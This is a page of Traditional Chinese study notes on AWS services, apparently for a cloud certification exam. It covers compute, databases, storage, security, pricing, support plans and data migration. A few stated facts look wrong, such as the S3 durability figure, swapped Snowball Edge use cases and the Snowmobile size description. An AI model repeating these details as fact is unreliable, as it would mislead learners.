EC2</h3><ul><li>執行個體類型<ul><li>一般用途<ul><li>應用程式中的運算、記憶體和網路功能資源需求大致相同</li></ul></li><li>運算最佳化<ul><li>需要運算密集型的應用</li><li>需要處理單一群組中有多筆交易的批次處理工作負載時，您也可以使用運算最佳化執行個體</li></ul></li><li>記憶體最佳化<ul><li>在於為記憶體內處理大型資料集的工作負載提供快速效能。在運算中，記憶體是暫時儲存區。它會保留中央處理單元（CPU）完成動作所需的所有資料和指令。</li><li>工作負載需要在執行應用程式之前預先載入大量資料。此種情況可能是高效能資料庫，或者需要執行大量非結構化資料即時處理的工作負載</li></ul></li><li>加速運算最佳化<ul><li>使用硬體加速器或協同處理器來提高執行某些功能的效率，其效果更勝在 CPU 上執行軟體的可行效率</li><li>使用硬體加速器或協同處理器來提高執行某些功能的效率，其效果更勝在 CPU 上執行軟體的可行效率</li></ul></li><li>儲存最佳化<ul><li>專為需要對本機儲存體上的超大型資料集進行高序列讀取及寫入存取工作負載所設計。適合儲存最佳化執行個體的工作負載包括分散式檔案系統、資料倉儲應用程式，以及高頻線上交易處理 (OLTP) 系統</li><li>為應用程式提供每秒數萬次低延遲的隨機 I&#x2F;O 操作 (IOPS) 而設計</li><li>應用程式具有高 IOPS 需求</li></ul></li></ul></li><li>EC2 定價<ul><li>隨需(On-Demand)<ul><li>適用不可中斷短期的工作負載</li><li>無須合約</li></ul></li><li>Saving Plan<ul><li>承諾一年或三年內維持一定的運算量</li><li>比隨需便宜</li></ul></li><li>預留執行個體<ul><li>可購買一年或三年期的執行個體</li><li>用量可以根據帳戶中的隨需執行個體而定</li></ul></li><li>Spot執行個體<ul><li>適合可以承受中斷的應用</li><li>像是批次任務</li></ul></li><li>專用主機<ul><li>實體EC2伺服器</li></ul></li></ul></li></ul><h3 id="AWS-Elastic-Beanstalk"><a href="#AWS-Elastic-Beanstalk" class="headerlink" title="AWS Elastic Beanstalk"></a>AWS Elastic Beanstalk</h3><ul><li>在您提供程式碼和組態設定後，Elastic Beanstalk 會負責部署執行下列任務所需的資源<ul><li>調整容量</li><li>負載平衡</li><li>自動擴展</li><li>應用程式運作狀態監控</li></ul></li></ul><h3 id="AWS-Lambda"><a href="#AWS-Lambda" class="headerlink" title="AWS Lambda"></a>AWS Lambda</h3><p><img src="https://i.imgur.com/iOCFQm5.png"></p><h3 id="Amazon-Lightsail"><a href="#Amazon-Lightsail" class="headerlink" title="Amazon Lightsail"></a>Amazon Lightsail</h3><ul><li>Amazon Lightsail 以經濟高效的每月價格，提供易於使用的虛擬私有伺服器 (VPS) 執行個體、容器、儲存、資料庫等。</li></ul><h3 id="Amazon-WorkSpaces"><a href="#Amazon-WorkSpaces" class="headerlink" title="Amazon WorkSpaces"></a>Amazon WorkSpaces</h3><ul><li>Amazon WorkSpaces 是一種用於 Windows 和 Linux 的全受管桌面虛擬化服務，可讓您從任何支援的裝置存取資源。</li></ul><h2 id="容器"><a href="#容器" class="headerlink" title="容器"></a>容器</h2><h3 id="Amazon-Elastic-Container-Service-Amazon-ECS"><a href="#Amazon-Elastic-Container-Service-Amazon-ECS" class="headerlink" title="Amazon Elastic Container Service (Amazon ECS)"></a>Amazon Elastic Container Service (Amazon ECS)</h3><ul><li>是可高度擴展的高效能容器管理系統，可讓您在 AWS 上輕鬆執行及擴展容器化應用程式</li><li>支援Docker</li></ul><h3 id="Amazon-Elastic-Kubernetes-Service-Amazon-EKS"><a href="#Amazon-Elastic-Kubernetes-Service-Amazon-EKS" class="headerlink" title="Amazon Elastic Kubernetes Service (Amazon EKS)"></a>Amazon Elastic Kubernetes Service (Amazon EKS)</h3><ul><li>透過它即可在 AWS 上執行 Kubernetes</li><li></li></ul><h3 id="AWS-Fargate"><a href="#AWS-Fargate" class="headerlink" title="AWS Fargate"></a>AWS Fargate</h3><ul><li>容器專用的無伺服器運算引擎，Amazon ECS 和 Amazon EKS 都適用。</li></ul><h2 id="資料庫"><a href="#資料庫" class="headerlink" title="資料庫"></a>資料庫</h2><h3 id="Amazon-Aurora"><a href="#Amazon-Aurora" class="headerlink" title="Amazon Aurora"></a>Amazon Aurora</h3><ul><li>企業級關聯式資料庫，比標準MySQL快5倍，比標準PostgreSQL快3倍</li><li>支援兩種資料庫選項: MySQL, PostgreSQL</li><li>成本極低</li><li>資料會被複寫到各項設施(隨時會有六份副本，最高可達15個讀取副本)</li><li>持續備份到Amazon S3</li><li>Point-in Time復原</li></ul><h3 id="Amazon-DynamoDB"><a href="#Amazon-DynamoDB" class="headerlink" title="Amazon DynamoDB"></a>Amazon DynamoDB</h3><ul><li>無伺服器資料庫，無須管理基礎執行個體或基礎設施</li><li>建立<strong>表格</strong>，以存放或查看資料</li><li>資料會被劃分成項目(Item)，項目具有屬性(Attribute)</li><li>屬性代表資料中的不同功能</li><li>會在多個可用區域當中儲存硬碟鏡像，提高可用性</li><li>高效能且可大規模擴展，回應時間為毫秒級</li><li>屬於NoSQL 資料庫</li><li>無法透過SQL進行查詢，可根據KEY屬性來進行查詢，靈活性高</li><li>使用案例: Amazon Prime Day應付大量使用者訂單請球</li></ul><h3 id="Amazon-ElastiCache"><a href="#Amazon-ElastiCache" class="headerlink" title="Amazon ElastiCache"></a>Amazon ElastiCache</h3><ul><li>為資料庫提供快取層，增加資料庫讀寫速度<ul><li>Memcached</li><li>Redis</li></ul></li></ul><h3 id="Amazon-DAX-DynamoDB-Accelerator"><a href="#Amazon-DAX-DynamoDB-Accelerator" class="headerlink" title="Amazon DAX(DynamoDB Accelerator)"></a>Amazon DAX(DynamoDB Accelerator)</h3><ul><li>為DynamoDB提供原生快速層，改善NoSQL資料讀取時間</li></ul><h3 id="Amazon-Relational-Database-Service-RDS"><a href="#Amazon-Relational-Database-Service-RDS" class="headerlink" title="Amazon Relational Database Service(RDS)"></a>Amazon Relational Database Service(RDS)</h3><ul><li>為<code>關聯式資料庫管理服務</code> (資料會已與其他資料建立關聯的方式來儲存)</li><li><h2 id="支援大多資料庫引擎-Amazon-Aurora-MySQL-PostgreSQL-MaraDB-Oracle-Micorsoft-SQL-Server"><a href="#支援大多資料庫引擎-Amazon-Aurora-MySQL-PostgreSQL-MaraDB-Oracle-Micorsoft-SQL-Server" class="headerlink" title="支援大多資料庫引擎  - Amazon Aurora  - MySQL  - PostgreSQL  - MaraDB  - Oracle  - Micorsoft SQL Server"></a>支援大多資料庫引擎<br>  - Amazon Aurora<br>  - MySQL<br>  - PostgreSQL<br>  - MaraDB<br>  - Oracle<br>  - Micorsoft SQL Server</h2></li><li>優點<ul><li>自動修補漏洞</li><li>備份</li><li>冗餘</li><li>容錯移轉</li><li>災難復原</li></ul></li><li>可進一步將它們部署至Amazon Aurora</li></ul><h3 id="Amazon-Redshift"><a href="#Amazon-Redshift" class="headerlink" title="Amazon Redshift"></a>Amazon Redshift</h3><ul><li>專為高速、即時擷取和查詢的資料庫，用於資料分析工作</li><li>大多關聯式資料庫容量有一定限制，因此不適合用於歷史資料分析</li><li>且資料種類繁雜，一班關聯式資料庫難易應付，因此這時需要<strong>資料倉儲(Data Warehouse)</strong></li><li>資料倉儲負責處理大數據，適用於歷史分析而不是營運分析</li><li>例如，一小時前我們的販售量如何，這種數字已經不會再變動了</li><li>而一般營運分析則是，我們現在的咖啡庫存如何，這種隨時在變動的資料</li><li>Redshift 可以實現傳統資料庫的10倍效能</li></ul><h3 id="AWS-Database-Migration-Service-Amazon-DMS"><a href="#AWS-Database-Migration-Service-Amazon-DMS" class="headerlink" title="AWS Database Migration Service(Amazon DMS)"></a>AWS Database Migration Service(Amazon DMS)</h3><ul><li>將客戶資料庫轉移至AWS</li><li>在遷移期間資料庫仍然能夠保持完全運作</li><li>仰賴該資料庫的應用程式停機時間能夠降至最低</li><li>來源與目標資料庫不用式相通類型的資料庫<ul><li>Oracle -&gt;RDS for Oracle</li><li>MySQL -&gt; RDS for MySQL</li></ul></li><li>異質遷移<ul><li>來淵資料庫以及目標資料庫的 <strong>結構描述(Schema)結構</strong>、<strong>資料類型</strong>、<strong>資料庫程式碼</strong> 不同時，就需要異質遷移</li><li>需要兩步驟<ul><li><ol><li>AWS Schema Conversion Tool進行轉換</li></ol></li><li><ol start="2"><li>DMS 用來遷移資料庫</li></ol></li></ul></li></ul></li><li>開發和測試資料庫遷移<ul><li>將資料庫副本遷移到生產或測試環境，可使用DMS服務</li></ul></li><li>資料庫合併</li><li>持續資料庫複寫<ul><li>可用於災難復原</li></ul></li></ul><h3 id="AWS-DocumentDB"><a href="#AWS-DocumentDB" class="headerlink" title="AWS DocumentDB"></a>AWS DocumentDB</h3><ul><li>用於完整文件儲存</li><li>適合內容管理、目錄、使用者設定檔</li></ul><h3 id="Amazon-Neptune"><a href="#Amazon-Neptune" class="headerlink" title="Amazon Neptune"></a>Amazon Neptune</h3><ul><li>圖形式資料庫用於社群網路和推薦引擎設計</li><li>也適合詐騙偵測需求</li><li>或者供應鏈追蹤管理</li></ul><h3 id="Amazon-QLDB-Quantum-Ledger-Database"><a href="#Amazon-QLDB-Quantum-Ledger-Database" class="headerlink" title="Amazon QLDB(Quantum Ledger Database)"></a>Amazon QLDB(Quantum Ledger Database)</h3><ul><li>不可變的紀錄系統</li><li>其中所有條目都無法存稽核中刪除</li></ul><h3 id="AWS-Auto-Scaling"><a href="#AWS-Auto-Scaling" class="headerlink" title="AWS Auto Scaling"></a>AWS Auto Scaling</h3><p><img src="https://i.imgur.com/6uOa7tx.png"></p><ul><li>動態擴展</li><li>預測性擴展<br><img src="https://i.imgur.com/oPepLm4.png"></li></ul><h3 id="AWS-CloudFormation"><a href="#AWS-CloudFormation" class="headerlink" title="AWS CloudFormation"></a>AWS CloudFormation</h3><ul><li>您可以將基礎設施當作程式碼(IaC)來處理。也就是說，您可以透過撰寫程式碼行來建立環境，無需使用 AWS 管理主控台個別佈建資源。</li><li>讓您不必執行手動動作或撰寫自訂指令碼，就能頻繁建立基礎設施和應用程式。它會在管理堆疊時判斷需要執行的正確作業，並在偵測到錯誤時自動復原變更。</li></ul><h3 id="AWS-CloudTrail"><a href="#AWS-CloudTrail" class="headerlink" title="AWS CloudTrail"></a>AWS CloudTrail</h3><ul><li>全方位的API稽核工具</li><li>所有對AWS提出的API請求，都會記錄在CloudTrail中</li><li>並且記錄誰提出請求，何時發出請求，IP為只為和，回應又是甚麼等等</li><li>可以在s3 bucket當中無期限儲存這些日誌</li><li>CloudTrail 中的事件通常會在 API 呼叫後的 15 分鐘內更新</li></ul><h3 id="Amazon-CloudWatch"><a href="#Amazon-CloudWatch" class="headerlink" title="Amazon CloudWatch"></a>Amazon CloudWatch</h3><ul><li>CloudWatch可以讓客戶監控aws基礎設施以及運行在上面的應用程式</li><li>他透過追蹤以及監控<strong>指標(與資源相關的變數)</strong> 來運作<ul><li>CPU使用率</li><li>RAM使用狀態</li></ul></li><li>CloudWatch 警示(Alerm)<ul><li>當指標達到閥值，可以觸發警示</li><li>整合SNS，可以傳送警示簡訊</li></ul></li><li>CloudWatach Dashboard <ul><li>以近即時方式列出指標</li></ul></li><li>CloudWatch的優點:<ul><li>從一個集中位置存取所有指標，獲得全系統的可見性</li><li>檢視應用、基礎設施及服務</li><li>減少<strong>MTTR(解決問題的平均時間)<strong>，</strong>並改善總整體成本(TCO)</strong></li><li>深入分析應用，並幫助最佳化客戶應用</li></ul></li></ul><h3 id="AWS-Trusted-Advisor"><a href="#AWS-Trusted-Advisor" class="headerlink" title="AWS Trusted Advisor"></a>AWS Trusted Advisor</h3><ul><li>為一自動化顧問</li><li>他會根據<strong>五大支柱</strong>來評估資源<ul><li>成本最佳化</li><li>效能</li><li>安全</li><li>容錯能力</li><li>Service Limits</li></ul></li><li>會對每個支柱進行一系列檢查，並編譯分類項目供檢視</li><li>有些檢查免費</li><li>檢查項目例如: 是否啟用MFA</li></ul><h2 id="網路連結與內容交付"><a href="#網路連結與內容交付" class="headerlink" title="網路連結與內容交付"></a>網路連結與內容交付</h2><h3 id="AWS-Elastic-Load-Balancing"><a href="#AWS-Elastic-Load-Balancing" class="headerlink" title="AWS Elastic Load Balancing"></a>AWS Elastic Load Balancing</h3><ul><li>一種可在多個資源 (例如 Amazon EC2 執行個體) 之間自動分配傳入應用程式流量的 AWS 服務</li></ul><p><img src="https://i.imgur.com/sJyERPV.png"></p><ul><li>ELB會作為傳入 Auto Scaling 群組之所有 Web 流量的單一聯絡窗口。也就是說，當您為了回應傳入流量而新增或移除 Amazon EC2 執行個體時，這些請求會先路由到負載平衡器，然後分散到即將處理這些請求的多個資源中。</li></ul><h2 id="安全性、識別與合規性"><a href="#安全性、識別與合規性" class="headerlink" title="安全性、識別與合規性"></a>安全性、識別與合規性</h2><p>共同責任模型(Shared Responsibility Model)<br><img src="https://i.imgur.com/wMSpH1U.png"><br><img src="https://i.imgur.com/HOmBArE.png"></p><ul><li>客戶記得自己patch OS</li><li>aws與客戶的關係如同房屋屋主以及建商</li></ul><h3 id="AWS-Artifact"><a href="#AWS-Artifact" class="headerlink" title="AWS Artifact"></a>AWS Artifact</h3><ul><li>可以存取合規性報告，報告本身由第三方所檢驗</li><li>AWS Artifact 協議<ul><li>公司需要與 AWS 簽署關於您在整個 AWS 服務中使用特定類型資訊的協定</li><li>可以檢閱、接受和管理個別帳戶以及 AWS Organizations 中所有帳戶的協議。其中會提供不同類型的協議</li></ul></li><li>AWS Artifact 報告<ul><li>可以檢閱、接受和管理個別帳戶以及 AWS Organizations 中所有帳戶的協議。其中會提供不同類型的協議，可在 AWS Artifact 報告中存取此資訊</li><li>在 AWS Artifact 報告中存取此資訊</li></ul></li></ul><h3 id="Amazon-GuardDuty"><a href="#Amazon-GuardDuty" class="headerlink" title="Amazon GuardDuty"></a>Amazon GuardDuty</h3><ul><li>AWS威脅偵測服務</li><li>會分析帳戶產生的中繼資料連續串流，像是來自CloudTrail、VPC Flow Logs、DNS log</li><li>與aws現有服務分開執行，不會影響現有基礎設設施效能</li></ul><h3 id="AWS-Identity-and-Access-Management-IAM"><a href="#AWS-Identity-and-Access-Management-IAM" class="headerlink" title="AWS Identity and Access Management (IAM)"></a>AWS Identity and Access Management (IAM)</h3><ul><li>透過IAM可以精細的控制權限</li><li>在IAM中可以建立IAM User</li><li>IAM在剛建立時，預設不具備任何許可(不可建立EC2, S3…etc)</li><li>最低權限原則</li><li>IAM政策<ul><li>是JSON文件，描述使用者可以執行或不可執行那些API操作</li><li>可以將政策連接到使用者或是群組</li><li>Effect: <code>Allow</code> <code>Deny</code></li><li>Action: 可對資源最哪些行為</li><li>Resource: API呼叫適用於哪種AWS資源</li></ul></li><li>IAM 群組 </li><li><img src="https://i.imgur.com/u29juKI.png"></li><li>角色(Role)<ul><li>不同工作時，角色會進行切換</li><li>在AWS中也能夠建立角色</li><li>角色具有相關聯的許可，可以允許或拒絕特定動作</li><li>使用者可以暫時擔任某個角色，但沒有使用者名稱或密碼</li><li>僅能獲得暫時的許可權</li></ul></li><li><img src="https://i.imgur.com/Ds4cHxv.png"></li></ul><h3 id="Amazon-Inspector"><a href="#Amazon-Inspector" class="headerlink" title="Amazon Inspector"></a>Amazon Inspector</h3><ul><li>針對基礎設施執行自動化安全評估，以提高安全性和aws部署應用程式的合規性</li><li>可用於察看與Best Practice之間的偏差</li><li>漏洞檢查</li><li>服務分成三種:<ul><li>網路組態可達性部分</li><li>Amazon 代理程式</li><li>安全性評定服務</li></ul></li></ul><h3 id="AWS-Shield"><a href="#AWS-Shield" class="headerlink" title="AWS Shield"></a>AWS Shield</h3><ul><li>是一項可保護應用程式免於遭受 DDoS 攻擊的服務</li><li>AWS Shideld Syandard<ul><li>可免費自動保護所有 AWS 客戶</li><li>使用分析技術即時偵測並自動延緩惡意流量</li></ul></li><li>AWS Shield Advanced<ul><li>可提供詳細的攻擊診斷，和偵測與減輕複雜的 DDoS 攻擊。</li></ul></li></ul><h3 id="AWS-WAF"><a href="#AWS-WAF" class="headerlink" title="AWS WAF"></a>AWS WAF</h3><ul><li>使用Web應用程式防火牆(WAF)來篩選傳入流量</li><li>機器學系幫助識別新威脅</li><li>主動防禦</li><li>可以設定Web ACL</li></ul><h3 id="AWS-Organizations"><a href="#AWS-Organizations" class="headerlink" title="AWS Organizations"></a>AWS Organizations</h3><ul><li>管理多個aws帳戶中的中央位置</li><li>管理帳單、控制存取、合規與安全</li><li>讓所有aws帳號共享資源</li><li>功能:<ul><li>集中式管理aws帳戶</li><li>所有帳戶可合併帳單(具有折扣)</li><li>實作帳戶的階層分組(ex. BU(業務單位)、OU(組織單位))</li><li>控制每個帳戶可以存取的AWS服務以及可執行的API動作<ul><li>服務控制政策(SCP)，可用於指定成員帳戶的最大許可</li></ul></li></ul></li><li><img src="https://i.imgur.com/qwvjWXE.png"></li></ul><h3 id="Amazon-Elastic-Block-Store-Amazon-EBS"><a href="#Amazon-Elastic-Block-Store-Amazon-EBS" class="headerlink" title="Amazon Elastic Block Store (Amazon EBS)"></a>Amazon Elastic Block Store (Amazon EBS)</h3><ul><li>不希望每次使用完EC2執行個體後，資料庫就被刪掉，則可使用EBS服務</li><li>可建立虛擬硬碟，EBS磁碟區，並連接到EC2執行個體上</li><li>EBS並不直接與EC2綁定，因此可以獨立於EC2的生命週期，來持久化存放資料</li><li>需定義：大小、類型、組態</li><li>用例: 持久化儲存讓EC2寫入資料，因此備份資料很重要</li><li>EBS允許增量備份資料(又稱作<strong>快照</strong>)</li><li>定期為EBS進行快照，以備份重要資料</li><li><strong>執行個體存放區</strong>: 為EC2中所提供的臨時區塊是存放區，當EC2終止時，存放區中的資料也會消失</li><li><img src="https://i.imgur.com/8AVNGzr.png"></li><li><img src="https://i.imgur.com/1kkfeOT.png"></li><li><img src="https://i.imgur.com/QNVkgdB.png"></li><li>EBS 快照: 第一次備份會複製磁碟區中所有資料，後續就只會儲最近一次快照以來變更的資料區塊，屬於<strong>增量備份</strong></li></ul><h3 id="Amazon-S3"><a href="#Amazon-S3" class="headerlink" title="Amazon S3"></a>Amazon S3</h3><ul><li>資料存放以<strong>物件</strong>形式存放，但並非存放於檔案目錄，而是存放在<strong>儲存眝體(bucket)</strong></li><li>上傳物件大小上限為： <strong>5TB</strong></li><li>可以建立**物件版本(Object Versioning)**，防止意外刪除</li><li>可以建立多個buckt，來放在不同資料類別或是資料層中</li><li>可建立許可(Permission)來限制誰可以存取物件</li><li><code>Amazon S3 Standard</code>: 具有 99.99999999% 耐久性，代表該檔案在一年後保持完整的機率<ul><li><code>資料存放的方式</code>: 資料至少會存放在三個設施中，在不同地點都有副本</li><li><code>靜態網站託管</code>: 託管html檔或其他靜態檔案資產到s3</li></ul></li><li><code>Amazon S3 Standard-Infrequent(IA)</code>: 用於存取頻率低，但需要時需要快速存取<ul><li>適合存放備份、災害復原、長期存放資料</li><li><code>Amazon S3 Glacier</code>: 可用於稽核資料長期存放</li><li>可建立文件庫，並使用<strong>文件庫鎖定政策</strong>，來滿足當地法規對於稽核資料存放年限的要求</li><li>可在文件庫鎖定政策中使用控制措施 - <strong>單寫多讀(WORM)</strong> 模型，來防止未來的寫入行為</li></ul></li><li>生命週期政策: 可在不同層之間自動移動資料<ul><li>例如: 需要將一個物件在S3 Standard中保留90天，接下來移動到s3-IA中保留30天，120天候移動到s3 glacier，這種時候就能夠建立生命週期政策來自動化這些行為</li></ul></li><li><code>Amazon S3 單區域-IA</code> <ul><li>資料存放在單一區域中</li><li>價格比S3 Standard-IA還要低</li><li>若想要節省儲存成本則選擇此儲存類別</li></ul></li><li><code>Amazon S3 Intelligent-Tiering</code><ul><li>適合存取模式未知或持續變更的資料</li><li>每個物件需要支付小額每月監控和自動化費用</li></ul></li><li>物件:</li><li><img src="https://i.imgur.com/fNAXd5H.png"></li></ul><h3 id="Amazon-S3-Glacier"><a href="#Amazon-S3-Glacier" class="headerlink" title="Amazon S3 Glacier"></a>Amazon S3 Glacier</h3><ul><li>專會資料封存所設計</li><li>能在幾分鐘或幾小時內擷取資料</li><li>可用於儲存已封存的客戶資料或是舊相片影片檔案</li></ul><h3 id="Amazon-S3-Glacier-Deep-Archive"><a href="#Amazon-S3-Glacier-Deep-Archive" class="headerlink" title="Amazon S3 Glacier Deep Archive"></a>Amazon S3 Glacier Deep Archive</h3><ul><li>適合封存的最低成本物件儲存類別</li><li>能在12小時內擷取物件</li></ul><h3 id="Amazon-Elastic-File-System-Amazon-EFS"><a href="#Amazon-Elastic-File-System-Amazon-EFS" class="headerlink" title="Amazon Elastic File System (Amazon EFS)"></a>Amazon Elastic File System (Amazon EFS)</h3><ul><li>允許多個執行個體同時存去EFS當中的資料</li><li>可是需求擴展或縮減</li></ul><h2 id="EBS-與-S3的比較"><a href="#EBS-與-S3的比較" class="headerlink" title="EBS 與 S3的比較"></a>EBS 與 S3的比較</h2><table><thead><tr><th></th><th>EBS</th><th>S3</th></tr></thead><tbody><tr><td>儲存容量</td><td>16TB</td><td>無限制，個別物件最高為5TB</td></tr><tr><td>特色</td><td>在EC2終止時繼續存活</td><td>單寫多讀(WORM)</td></tr><tr><td>儲存型態</td><td>固態</td><td></td></tr><tr><td>耐久度</td><td></td><td>99.99999999%</td></tr><tr><td>使用案例</td><td>80GB影片檔案正在編輯，可啟用物件版本紀錄，而不用每次都重新上傳全新的物件，採用區塊式儲存</td><td>靜態網站託管、區域分散式儲存、資料備份、無伺服器</td></tr><tr><td>總結案例</td><td>複雜寫入讀取更動等功能</td><td>完整物件、偶而更動等資料</td></tr></tbody></table><h2 id="EBS-與-EFS的差別"><a href="#EBS-與-EFS的差別" class="headerlink" title="EBS 與 EFS的差別"></a>EBS 與 EFS的差別</h2><ul><li>EBS磁碟區會連接到EC2，而EBS是 <strong>可用區域層級資源</strong>，若要將EC2連接到EBS上，兩者必須位於相同可用區域當中</li><li>EBS是硬碟，可存放檔案資料、資料庫或應用程式，硬碟區塞滿後，並不會資動擴展</li><li>EFS並不是一個空白的硬碟，而是真正的Linux檔案系統</li><li>EFS是一種<strong>區域性資源</strong>，區域內的任何EC2都能夠寫入EFS檔案系統</li><li>EFS寫入更多資料時，它會自動擴展</li></ul><h2 id="RDS-和-DynamoDB的差別"><a href="#RDS-和-DynamoDB的差別" class="headerlink" title="RDS 和 DynamoDB的差別"></a>RDS 和 DynamoDB的差別</h2><table><thead><tr><th>RDS</th><th>DynamoDB</th></tr></thead><tbody><tr><td>自動高可用性、可提供復原</td><td>鍵值對，不須結構性描述</td></tr><tr><td>客戶擁有資料所有權</td><td>巨大傳輸容量</td></tr><tr><td>客戶擁有描述所有權(Schema)</td><td>PB級大小擴展潛力</td></tr><tr><td>客戶對網路有控制權</td><td>精密API存取權限</td></tr></tbody></table><p>使用案例:</p><ul><li>銷售供應鏈管理系統，若要進行商業分析，則需要複雜的關聯式連結，這時就適合使用RDS</li><li>上述案例外的其他案例，DynamoDB幾乎都可用，大多案例不需要複雜的關聯式連結，像是員工聯絡人表格，用單一表格就能夠解決了，RDS的複雜功能以及管理費用，DynamoDB則能夠消除所有管理費用，並且可建立快速高效能的資料庫</li></ul><h2 id="定價"><a href="#定價" class="headerlink" title="定價"></a>定價</h2><ul><li>免費方案:<ul><li>永遠免費<ul><li>AWS Lamda每個月允許一百萬次免費呼叫</li></ul></li><li>12個月免費<ul><li>S3 可免費使用12個月高達5GB的儲存</li></ul></li><li>某些服務可以短期試用<ul><li>Lightsaul 提供一個月的試用期，使用期間最高可達750小時</li></ul></li></ul></li><li>Pricing Model<ul><li>Pay-as-you-go 按照使用量付費，無須長期合約</li><li>預留容量</li><li>以量計算的折扣: 某些服務提供分級定價，每單位成本隨著用量增加而降低<ul><li>Ex. S3儲存空間越多，每GB支付費用就越少</li></ul></li></ul></li><li>定價計算機</li><li>帳單儀表板<ul><li>存取 Cost Explorer 並建立預算</li><li>將您本月份至今的餘額與上個月進行比較，並根據目前的用量獲得下個月的預測</li><li>檢視各項服務免費方案用量</li><li>發布 AWS 成本和用量報告</li></ul></li><li>合併帳單<ul><li>為AWS Organization的功能之一</li><li>可以將個別aws帳戶的帳單合併，ˇ但還是可以分項查看帳單</li><li>可以將AWS資源的使用量彙總到組織層級</li><li>個別帳戶帳單即使金額低，若合併組織中的帳單有機會獲得批量折扣價</li><li>簡化計費流程</li><li>免費功能</li><li>一個組織允許的預設帳戶數目上限為 4 個</li></ul></li><li>預算服務<ul><li>可以建立預算金額閥值，並發出警示提醒到電子郵件中 </li><li>預算中的資訊每天更新三次</li></ul></li><li>Cost Explorer<ul><li>以控制台為基礎的服務，可透過視覺化來查看跟分析在aws上的花費</li><li>會顯示在哪個服務上化最多錢</li><li>並提供12個月的歷史資料，可追蹤成本隨時間的變化</li><li>提供強大的報表，也可自定義報表內容</li></ul></li></ul><h2 id="Support-服務"><a href="#Support-服務" class="headerlink" title="Support 服務"></a>Support 服務</h2><ul><li>基本支援(免費)<ul><li>24小時客服服務</li><li>文件、白皮書、論壇</li><li>AWS Trusted Advisor</li><li>AWS Personal Health Dashboard</li></ul></li><li>開發人員方案<ul><li>基本支援</li><li>電子郵件取得客戶支援(12小時回覆)</li></ul></li><li>商業支援<ul><li>基本與開發人員支援</li><li>AWS Trusted Advisor提供完整最佳實踐檢查</li><li>直接與雲端支援工程師電話聯絡(4小時的回應SLA)</li><li>若生產系統受損，針對損壞的生產系統提供1小時的SLA</li><li>基礎設施事件管理(EX.大型活動、全球發布會…etc)</li></ul></li><li>企業支援(適合執行關鍵任務工作負載的公司)<ul><li>基本、開發人員和商業支援(外加針對商業關鍵工作負載的15分鐘SLA)</li><li>適用於TAM(Technical Account Manager)的技術帳戶管理員<ul><li>TAM會與客戶一同根據Well-Architected 架構來檢視企業架構</li></ul></li></ul></li></ul><p><img src="https://i.imgur.com/r20KK1m.png"></p><h2 id="AWS-Marketplace"><a href="#AWS-Marketplace" class="headerlink" title="AWS Marketplace"></a>AWS Marketplace</h2><ul><li>是包含獨立軟體開發廠商數千種軟體產品的數位型錄，可簡化、部署和管理在AWS架構中執行第三方軟體的步驟</li><li>您可以使用 AWS Marketplace 尋找、測試和購買能在 AWS 上執行的軟體</li><li>當客戶在使用Marketplace中的第三方應用時，無需建構安裝維護這些程式所需的基礎設施</li><li>一鍵式部署</li><li>一樣按使用量付費</li><li>許多廠商提供免費試用</li><li>以企業為主的功能<ul><li>可自訂條款和定價，可管理自訂授權合約</li><li>私人市集，可建立符合當地法規或安全要求的預先核准軟體決方案目錄</li><li>整合採購系統</li><li>aws成本管理工具</li></ul></li></ul><h2 id="AWS-Cloud-Adoption-Framework-AWS-CAF"><a href="#AWS-Cloud-Adoption-Framework-AWS-CAF" class="headerlink" title="AWS Cloud Adoption Framework(AWS CAF)"></a>AWS Cloud Adoption Framework(AWS CAF)</h2><ul><li>向客戶公司提供建議，藉由指引協助客戶管理遷移至雲端的過程</li><li>AWS CAF觀點(不同領域的人帶來不同觀點，並且會有不同的遷移策略)<ul><li>商業: 側重商業能力</li><li>人員: 側重商業能力</li><li>治理: 側重商業能力</li><li>平台: 技術能力</li><li>安全: 技術能力</li><li>營運: 技術能力</li></ul></li></ul><h2 id="遷移策略"><a href="#遷移策略" class="headerlink" title="遷移策略"></a>遷移策略</h2><ul><li>6個R策略<ul><li>重新託管(Rehosting)<ul><li>選取應用程式幾乎照搬到AWS</li><li>僅透過重新託管能夠節省高達30%的總成本</li></ul></li><li>平台重建&#x2F;微調搬遷<ul><li>會進行一些雲端最佳化，但不需要調整核心程式碼</li></ul></li><li>汰換(Retired)<ul><li>某些企業的it產品組合中包含不再使用的應用程式</li></ul></li><li>保留(Retain)<ul><li>某些應用程式需要被取代，但時機未到，可能還會再跑好幾個月</li><li>這些應用就可遷移到aws</li></ul></li><li>重新購買(Repurchase)<ul><li>放棄舊有授權軟體，轉用雲端原生產品等</li><li>前期成本高，但潛在益處大</li></ul></li><li>重構(Refactor)<ul><li>重寫程式碼</li><li>某些功能可能是以前無法再內部部署的</li></ul></li></ul></li></ul><h2 id="AWS-Snow-Family"><a href="#AWS-Snow-Family" class="headerlink" title="AWS Snow Family"></a>AWS Snow Family</h2><p>皆防竄改，皆由客戶的256bit金鑰來對資料進行加密<br><img src="https://i.imgur.com/2lh2GeS.png"></p><h3 id="AWS-Snowcone"><a href="#AWS-Snowcone" class="headerlink" title="AWS Snowcone"></a>AWS Snowcone</h3><ul><li>最多可容納8TB的資料並包含<strong>邊緣運算(包含EC2和AWS IOT Greengrass)</strong></li><li>可以透過aws主控台下單裝置</li><li>客戶可以安裝裝置並複製資料再運回aws</li><li>aws再將資料複製到aws帳戶中的s3 bucket</li><li>8TB,4G RAM, 2CPU</li></ul><h3 id="AWS-Snowball-Edge"><a href="#AWS-Snowball-Edge" class="headerlink" title="AWS Snowball Edge"></a>AWS Snowball Edge</h3><ul><li>兩種選項<ul><li>Compute Optimized:<ul><li>適合大規模資料遷移以及週期性傳輸工程</li><li>80TB</li></ul></li><li>Storage Optimized: <ul><li>適合機器學習、全動態影片分析以及本機運算堆疊</li><li>80TB</li></ul></li></ul></li><li>可以放入現有伺服器機架</li><li>並可使用ec2或iot Greengras做運算</li><li>使用案例<ul><li>Iot裝置串流</li><li>影片轉碼</li><li>工業訊號處理</li></ul></li></ul><h3 id="AWS-Snowmobile"><a href="#AWS-Snowmobile" class="headerlink" title="AWS Snowmobile"></a>AWS Snowmobile</h3><ul><li>裝置在45英尺高的巨大容器中</li><li>由卡車運送</li><li>容納100PB(100000TB)的資料</li><li>裝置防竄改、防水、滅火，具有溫度控制功能</li><li>安全團隊視訊監控護宋團隊</li></ul><h2 id="可用區域-Avaiable-Zone"><a href="#可用區域-Avaiable-Zone" class="headerlink" title="可用區域(Avaiable Zone)"></a>可用區域(Avaiable Zone)</h2><p><img 